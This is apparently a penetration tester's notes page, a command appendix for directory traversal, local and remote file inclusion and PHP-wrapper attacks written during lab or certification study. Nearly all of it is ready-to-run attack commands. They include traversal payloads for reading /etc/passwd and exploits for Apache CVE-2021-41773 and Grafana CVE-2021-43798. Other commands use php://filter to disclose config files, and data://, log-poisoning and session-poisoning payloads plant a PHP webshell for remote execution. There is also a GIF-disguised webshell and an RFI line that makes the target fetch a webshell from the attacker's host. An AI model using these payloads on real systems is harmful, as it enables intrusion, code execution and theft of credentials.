# File Inclusion & Traversal, Command Appendix

Part of [[COMMAND APPENDIX]]. Directory traversal, LFI, RFI, and the PHP-wrapper variants.

---

## Directory Traversal / LFI / RFI Payloads

```bash
# Plain traversal
curl "http://<target>/index.php?page=../../../../../../../../../etc/passwd"

# URL-encoded dots, bypasses filters matching only the literal string
curl "http://<target>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Non-recursive bypass: app strips ../ but only once (not recursively)
# After stripping ../ from ....// : ../  |  After stripping ./ from ..././ : ../
curl "http://<target>/index.php?page=....//....//....//....//etc/passwd"
curl "http://<target>/index.php?page=..././..././..././..././etc/passwd"

# Double URL-encoding bypass: validation decodes once (sees %2E%2E%2F, no dots/slashes),
# but the include/file-open layer decodes again (gets ../)
# %252E = % encoded as %25, giving %2E after one decode. %252F = %2F after one decode.
curl "http://<target>/contact.php?region=%252E%252E%252Fuploads%252Fshell.php&cmd=id"

# Apache CVE-2021-41773/42013's specific asymmetric-first-segment pattern
curl --path-as-is "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Grafana CVE-2021-43798 (core plugin path traversal, no auth needed)
curl --path-as-is "http://<target>:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"

# Null-byte truncation — legacy-PHP-specific bypass (PHP < 5.3.5 only)
curl -k "https://<target>/vulnerable.php?param=../../../../../../etc/passwd%00"
```

## LFI — php://filter (Source Code Disclosure)

```bash
# Read PHP file as base64 (no allow_url_include needed)
curl "http://<target>/index.php?page=php://filter/read=convert.base64-encode/resource=configure"
# Decode: echo -n 'BASE64STRING' | base64 -d

# Extract base64 cleanly from HTML-wrapped response (grep/sed pipeline)
curl -s 'http://<target>/index.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' \
    | grep "W1BI" \
    | sed 's/ \{12\}//g' \
    | sed 's/<p class="read-more">//g' > configBase64.txt
cat configBase64.txt | base64 -d | grep 'allow_url_include'

# Fuzz for PHP files first, then read high-value ones
ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
     -u http://<target>:<port>/FUZZ.php
# Then: ?page=php://filter/read=convert.base64-encode/resource=<discovered_file>
```

**High-value filter targets:**
- `configure` / `config`, often holds DB creds, API keys
- `../../../../etc/php/7.4/apache2/php.ini` — check `allow_url_include` before data:// or RFI
- Application logic files, find upload paths, hidden parameters, validation code

## LFI — data:// Wrapper (RCE, needs allow_url_include = On)

```bash
# Encode the webshell as base64 (avoids URL-unsafe chars in raw PHP)
echo '<?php system($_GET["cmd"]); ?>' | base64
# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# URL-encode the base64 string (+ and = break URL parsing)
python3 -c 'import urllib.parse; print(urllib.parse.quote("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'
# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D

# Execute commands
curl -s 'http://<target>/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep -v "<.*>"

# Plain variant (simpler but breaks on complex payloads with special chars)
curl "http://<target>/index.php?page=data://text/plain,<?php%20echo%20system('id');?>"
```

## LFI — Log Poisoning

```bash
# User-Agent Apache log poisoning via Burp:
# 1. Intercept any request, set User-Agent: <?php system($_GET['cmd']); ?>
# 2. Include the log via LFI:
curl "http://<target>/index.php?page=/var/log/apache2/access.log&cmd=id"

# Multi-word commands: URL-encode spaces as %20 or use IFS trick
curl "http://<target>/index.php?page=/var/log/apache2/access.log&cmd=ls%20-la"
curl "http://<target>/index.php?page=/var/log/apache2/access.log&cmd=ls\${IFS}-la"

# Other log targets
# /var/log/nginx/access.log — Nginx
# /var/log/apache2/error.log — Apache error log
# /var/log/auth.log — SSH auth log (poison username field of a failed SSH login)
# /proc/self/fd/N — file descriptors (can include open log handles)
```

## LFI — PHP Session File Poisoning

```bash
# 1. Get PHPSESSID from browser DevTools → Application/Storage → Cookies
# 2. Read session file via LFI:
curl "http://<target>/index.php?page=/var/lib/php/sessions/sess_PHPSESSID_VALUE"

# 3. Identify which URL parameter controls a session field (test by setting unique value)
# 4. Poison with URL-encoded webshell:
curl "http://<target>/index.php?page=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"
#   Decoded: <?php system($_GET["cmd"]); ?>

# 5. Execute via LFI + session include:
curl "http://<target>/index.php?page=/var/lib/php/sessions/sess_PHPSESSID_VALUE&cmd=id"
```

## LFI + File Upload (GIF Magic Bytes)

```bash
# Create a PHP webshell disguised as a GIF (magic bytes pass image-type checks)
cat << 'EOF' > shell.gif
GIF8<?php system($_GET['cmd']); ?>
EOF
file shell.gif    # confirms: GIF image data 26736 x 8304

# Upload via the web app's file upload form (check /settings.php, /upload.php, /apply.php, etc)
# After upload, view page source to find the stored file path (e.g. /profile_images/shell.gif)

# Include via LFI:
curl -s -w "\n" 'http://<target>/index.php?page=./profile_images/shell.gif&cmd=ls+/' | grep -v "<.*>"
# Note: GIF8 appears before command output — strip it when reading flag filenames

# Read the flag (also has GIF8 prefix):
curl -s 'http://<target>/index.php?page=./profile_images/shell.gif&cmd=cat+/FLAGFILE.txt' | grep -v "<.*>"
```

## LFI — RFI (Remote File Inclusion, needs allow_url_include = On)

```bash
# Create a plain PHP webshell (no GIF magic bytes needed for RFI)
cat << 'EOF' > webShell.php
<?php system($_GET['cmd']); ?>
EOF

# Serve it (Python http.server for simplicity)
python3 -m http.server 8000

# Include remotely (confirm tun0 IP first: ip a | grep tun0)
curl -w "\n" -s 'http://<target>/index.php?page=http://PWNIP:8000/webShell.php&cmd=ls+/' | grep -v "<.*>"
```

## LFI — Automated Scanning with ffuf

```bash
# Phase 1: discover hidden parameters (two-run approach)
# First run to find noise size:
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://<target>:<port>/index.php?FUZZ=key'
# Note the dominant Size value (e.g. 2309) — that's the noise

# Second run with filter:
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://<target>:<port>/index.php?FUZZ=key' -fs 2309
# Hits with different sizes = real parameters that affect the response

# Phase 2: LFI payload fuzzing on discovered parameter
# First run to find noise size:
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://<target>:<port>/index.php?view=FUZZ'

# Second run filtered:
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://<target>:<port>/index.php?view=FUZZ' -fs 1935
# Use any confirmed payload to read the target file
```

## LFI — Skills Assessment: Compute Upload Filename (md5_file)

```bash
# When upload handler uses md5_file() to name uploaded files, pre-compute the filename:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
md5sum shell.php
# Output: fc023fcacb27a7ad72d605c4e300b389  shell.php
# File on server: /uploads/fc023fcacb27a7ad72d605c4e300b389 (no extension)
```

See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]], [[Common Web Application Attacks#9.1.3. Encoding Special Characters|9.1.3]], [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]], [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]], [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]], [[File Inclusion (HTB Supplementary)]] (all new techniques above), [[Beep|Beep box writeup]] (null-byte trick).

#### Tags: #DirectoryTraversal #LFI #RFI #PHPWrappers #NullByteBypass #NonRecursiveBypass #DoubleURLEncoding #PHPFilters #LogPoisoning #SessionPoisoning #GIFMagicBytes #AutomatedScanning #LFIJhaddix

---

## **Outstanding**
This area grows alongside the modules. Whenever a new traversal/inclusion variant comes up (Windows-specific LFI, Java/other-language equivalents, etc), add it here with a link back to the source section.
